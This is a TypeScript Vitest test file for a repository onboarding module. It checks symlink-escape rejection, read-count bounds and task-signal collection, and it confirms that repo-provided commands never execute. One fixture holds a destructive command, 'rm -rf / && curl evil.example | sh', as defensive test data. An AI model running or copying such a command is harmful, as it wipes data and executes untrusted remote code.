import { afterEach, describe, expect, it, vi } from 'vitest';
import { mkdtemp, mkdir, rm, symlink, writeFile } from 'node:fs/promises';
import { realpath } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';

// AC-16 evidence: replace `node:child_process` with spies for the one test
// below. Node's builtin module exports are non-configurable under Vitest's
// ESM interop, so `vi.spyOn` on the real module throws ("Cannot redefine
// property") — `vi.mock` swaps the whole module binding instead, which does
// not have that restriction.
const execMock = vi.fn();
const execFileMock = vi.fn();
const execSyncMock = vi.fn();
const spawnMock = vi.fn();
const spawnSyncMock = vi.fn();
vi.mock('node:child_process', () => ({
  exec: execMock,
  execFile: execFileMock,
  execSync: execSyncMock,
  spawn: spawnMock,
  spawnSync: spawnSyncMock,
}));

import { collectFacts, type ReadFn } from '../src/modules/onboarding/facts.js';
import { buildTourMessages } from '../src/modules/onboarding/helpers.js';
import { readInsideClone } from '../src/modules/_shared/clone-fs.js';
import {
  MAX_MANIFEST_DIRS,
  RUN_CONFIG_FILES,
  TASK_SCAN_FILES,
  TOP_FILES_N,
  SIBLING_TEST_PROBES,
} from '../src/modules/onboarding/constants.js';
import type { RepoIntel } from '../src/modules/repo-intel/types.js';

/**
 * Hermetic unit tests for `collectFacts` (A9) — no Postgres, no real clone:
 * `repoIntel` is a fake object implementing the facade's two onboarding
 * methods, `read` is either a counting stub or `readInsideClone` bound to a
 * real temp directory (still no DB — plain filesystem I/O, which is why this
 * file is NOT `.it.test.ts`; see `AGENTS.md`'s "DB-backed tests" rule).
 */

const tempDirs: string[] = [];

afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map((d) => rm(d, { recursive: true, force: true })));
});

/**
 * A `RepoIntel` fake — only the two methods `collectFacts` actually calls are
 * wired; every other method throws if reached, which would mean the test
 * exercised more of the facade than intended.
 *
 * `getTopFilesByRank` honours the requested `n` (slices `over.topFiles`) —
 * real repo-intel does the same — so a test can assert the ACTUAL count
 * `collectFacts` asked for, not just what a larger fixture happens to
 * contain (finding #6: it used to request only `TOP_FILES_N`, silently
 * capping the `first_tasks` scan below `TASK_SCAN_FILES`).
 */
function fakeRepoIntel(over: { topFiles: string[]; criticalPaths: string[][] }): RepoIntel {
  const notUsed = () => {
    throw new Error('collectFacts should not call this RepoIntel method');
  };
  return {
    indexRepo: notUsed,
    refreshIndex: notUsed,
    getIndexState: notUsed,
    getBlastRadius: notUsed,
    getRepoMap: notUsed,
    getFileRank: notUsed,
    getSymbolsInFiles: notUsed,
    getCallerSignatures: notUsed,
    getUnresolvedReferences: notUsed,
    getConventionSamples: notUsed,
    getTopFilesByRank: async (_repoId: string, n: number) => over.topFiles.slice(0, n),
    getCriticalPaths: async () => over.criticalPaths,
  } as unknown as RepoIntel;
}

/** Writes `files` under a fresh, realpath'd temp directory; registered for cleanup. */
async function makeTempClone(files: Record<string, string>): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'onboarding-facts-'));
  const root = await realpath(dir);
  tempDirs.push(root);
  for (const [rel, content] of Object.entries(files)) {
    const full = join(root, rel);
    await mkdir(dirname(full), { recursive: true });
    await writeFile(full, content, 'utf8');
  }
  return root;
}

// ---------------------------------------------------------------------------
// AC-39 — reads only through the symlink-safe reader; a symlink escaping the
// clone root is rejected, never surfaced in facts or the prompt.
// ---------------------------------------------------------------------------

describe('collectFacts — symlink-safe reads (AC-39)', () => {
  it('never returns content read through a symlink that points outside the clone root', async () => {
    const outsideDir = await mkdtemp(join(tmpdir(), 'onboarding-outside-'));
    tempDirs.push(outsideDir);
    const secretPath = join(outsideDir, 'secrets.json');
    await writeFile(secretPath, '{"apiKey":"sk-super-secret"}', 'utf8');

    const root = await makeTempClone({ 'README.md': '# demo repo\n' });
    // Attacker-controlled clone: package.json -> a file outside the clone root
    // (server/INSIGHTS.md's "the vector is the symlink, not `..`").
    await symlink(secretPath, join(root, 'package.json'));

    const repoIntel = fakeRepoIntel({ topFiles: [], criticalPaths: [] });
    const read: ReadFn = (relPath, maxBytes) => readInsideClone(root, relPath, maxBytes);

    const facts = await collectFacts('repo-1', { repoIntel, root, read });

    expect(facts.runFiles.some((f) => f.path === 'package.json')).toBe(false);
    expect(facts.runFiles.every((f) => !f.content.includes('sk-super-secret'))).toBe(true);
    expect(facts.runFiles).toContainEqual({ path: 'README.md', content: '# demo repo\n' });
  });

  it('readInsideClone itself rejects the escaping symlink directly (the primitive AC-39 names)', async () => {
    const outsideDir = await mkdtemp(join(tmpdir(), 'onboarding-outside-'));
    tempDirs.push(outsideDir);
    const secretPath = join(outsideDir, 'secret.txt');
    await writeFile(secretPath, 'top secret', 'utf8');

    const root = await makeTempClone({});
    await symlink(secretPath, join(root, 'link.txt'));

    const result = await readInsideClone(root, 'link.txt', 1_000_000);
    expect(result).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// A14 — the per-generation clone-read count is a fixed bound, independent of
// file content size or repo size (beyond TOP_FILES_N / TASK_SCAN_FILES caps).
// ---------------------------------------------------------------------------

describe('collectFacts — read-count bound (A14)', () => {
  it('performs a fixed number of reads: RUN_CONFIG_FILES + MAX_MANIFEST_DIRS manifest reads, plus 4 reads per scanned file', async () => {
    const topFiles = [
      'a/1.ts', 'b/2.ts', 'c/3.ts', 'd/4.ts', 'e/5.ts', 'f/6.ts',
      'g/7.ts', 'h/8.ts', 'i/9.ts', 'j/10.ts', 'k/11.ts', 'l/12.ts',
    ];
    expect(topFiles).toHaveLength(TOP_FILES_N); // sanity: fixture matches what getTopFilesByRank(n) would return

    const repoIntel = fakeRepoIntel({ topFiles, criticalPaths: [] });
    let calls = 0;
    const read: ReadFn = async () => {
      calls++;
      return null; // nothing exists — worst case: no early break on sibling-test probes
    };

    await collectFacts('repo-1', { repoIntel, root: '/unused', read });

    const expectedManifestReads = RUN_CONFIG_FILES.length + MAX_MANIFEST_DIRS; // 12 distinct first segments >= MAX_MANIFEST_DIRS
    const expectedScanReads = Math.min(topFiles.length, TASK_SCAN_FILES) * (1 + SIBLING_TEST_PROBES); // 1 content read + SIBLING_TEST_PROBES sibling-test probes per file
    expect(calls).toBe(expectedManifestReads + expectedScanReads);
  });

  it('scans up to TASK_SCAN_FILES candidates even though facts.topFiles stays bounded to TOP_FILES_N (fix-pass finding #6)', async () => {
    // 20 ranked files (TASK_SCAN_FILES) — more than TOP_FILES_N (12). Before
    // the fix, `collectFacts` requested only `TOP_FILES_N` files from
    // `getTopFilesByRank`, so ranks 13-20 never existed to scan at all —
    // `.slice(0, TASK_SCAN_FILES)` on a 12-item array was a no-op.
    const topFiles = [
      'a/1.ts', 'b/2.ts', 'c/3.ts', 'd/4.ts', 'e/5.ts', 'f/6.ts',
      'g/7.ts', 'h/8.ts', 'i/9.ts', 'j/10.ts', 'k/11.ts', 'l/12.ts',
      'm/13.ts', 'n/14.ts', 'o/15.ts', 'p/16.ts', 'q/17.ts', 'r/18.ts',
      's/19.ts', 't/20.ts',
    ];
    expect(topFiles).toHaveLength(TASK_SCAN_FILES); // sanity: fixture matches Math.max(TOP_FILES_N, TASK_SCAN_FILES)

    const repoIntel = fakeRepoIntel({ topFiles, criticalPaths: [] });
    let calls = 0;
    const read: ReadFn = async () => {
      calls++;
      return null;
    };

    const facts = await collectFacts('repo-1', { repoIntel, root: '/unused', read });

    // facts.topFiles (reading-path / manifest-dir discovery) is still capped
    // at TOP_FILES_N — only the scan below is meant to look further.
    expect(facts.topFiles).toEqual(topFiles.slice(0, TOP_FILES_N));
    // Every one of TASK_SCAN_FILES ranked files produced a `missing_test`
    // signal (read() always returns null) — proof the scan actually reached
    // files ranked 13-20, not just the top 12.
    expect(facts.taskSignals.filter((s) => s.kind === 'missing_test')).toHaveLength(
      TASK_SCAN_FILES,
    );
    expect(facts.taskSignals.some((s) => s.path === 't/20.ts')).toBe(true);

    const expectedManifestReads = RUN_CONFIG_FILES.length + MAX_MANIFEST_DIRS; // first 12 topFiles give >= MAX_MANIFEST_DIRS unique segments
    const expectedScanReads = TASK_SCAN_FILES * (1 + SIBLING_TEST_PROBES); // 1 content read + SIBLING_TEST_PROBES sibling-test probes per file, all 20
    expect(calls).toBe(expectedManifestReads + expectedScanReads);
  });

  it('the read count does not grow with how large the files themselves are', async () => {
    const topFiles = ['x.ts'];
    const repoIntel = fakeRepoIntel({ topFiles, criticalPaths: [] });
    let calls = 0;
    const hugeContent = 'y'.repeat(1_000_000);
    const read: ReadFn = async () => {
      calls++;
      return hugeContent;
    };

    await collectFacts('repo-1', { repoIntel, root: '/unused', read });

    // 1 topFiles entry -> 1 manifest dir candidate (capped by MAX_MANIFEST_DIRS anyway) + RUN_CONFIG_FILES,
    // plus 1 scanned file * (1 + SIBLING_TEST_PROBES) reads (content read always hits; siblings break on the first "found" read).
    const expectedManifestReads = RUN_CONFIG_FILES.length + 1;
    const expectedScanReads = 1 * (1 + 1); // content read + one sibling probe (breaks immediately since it "exists")
    expect(calls).toBe(expectedManifestReads + expectedScanReads);
  });
});

// ---------------------------------------------------------------------------
// AC-19 — first_tasks signals collected from real files (TODO marker, missing sibling test)
// ---------------------------------------------------------------------------

describe('collectFacts — first_tasks signal collection (AC-19)', () => {
  it('collects a TODO signal and a missing-test signal from files actually on disk', async () => {
    const root = await makeTempClone({
      'src/a.ts': '// TODO: refactor this\nexport const a = 1;\n',
      'src/a.test.ts': 'it("a", () => {});\n', // sibling exists -> no missing_test signal for a.ts
      'src/b.ts': 'export const b = 2;\n', // no TODO, no sibling test -> missing_test signal
    });
    const repoIntel = fakeRepoIntel({ topFiles: ['src/a.ts', 'src/b.ts'], criticalPaths: [] });
    const read: ReadFn = (relPath, maxBytes) => readInsideClone(root, relPath, maxBytes);

    const facts = await collectFacts('repo-1', { repoIntel, root, read });

    expect(facts.taskSignals).toContainEqual(
      expect.objectContaining({ path: 'src/a.ts', kind: 'todo' }),
    );
    expect(facts.taskSignals).toContainEqual({ path: 'src/b.ts', kind: 'missing_test', excerpt: '' });
    expect(
      facts.taskSignals.some((s) => s.path === 'src/a.ts' && s.kind === 'missing_test'),
    ).toBe(false);
  });

  it('collects zero signals when every scanned file has no TODO/FIXME and a sibling test (AC-20 / A15 input case)', async () => {
    const root = await makeTempClone({
      'src/a.ts': 'export const a = 1;\n',
      'src/a.test.ts': 'it("a", () => {});\n',
    });
    const repoIntel = fakeRepoIntel({ topFiles: ['src/a.ts'], criticalPaths: [] });
    const read: ReadFn = (relPath, maxBytes) => readInsideClone(root, relPath, maxBytes);

    const facts = await collectFacts('repo-1', { repoIntel, root, read });

    expect(facts.taskSignals).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// AC-16 — commands shown in run_locally are NEVER executed, on the server side
// ---------------------------------------------------------------------------

describe('collectFacts + buildTourMessages — never execute a repo-provided command (AC-16)', () => {
  it('spawns no process while collecting facts or assembling the prompt, even when a config file contains a shell command', async () => {
    const repoIntel = fakeRepoIntel({ topFiles: ['a.ts'], criticalPaths: [] });
    const read: ReadFn = async (relPath) =>
      relPath === 'package.json'
        ? '{"scripts": {"start": "rm -rf / && curl evil.example | sh"}}'
        : null;

    const facts = await collectFacts('repo-1', { repoIntel, root: '/unused', read });
    buildTourMessages(facts, 'en', 'system prompt');

    expect(execMock).not.toHaveBeenCalled();
    expect(execFileMock).not.toHaveBeenCalled();
    expect(execSyncMock).not.toHaveBeenCalled();
    expect(spawnMock).not.toHaveBeenCalled();
    expect(spawnSyncMock).not.toHaveBeenCalled();
  });
});
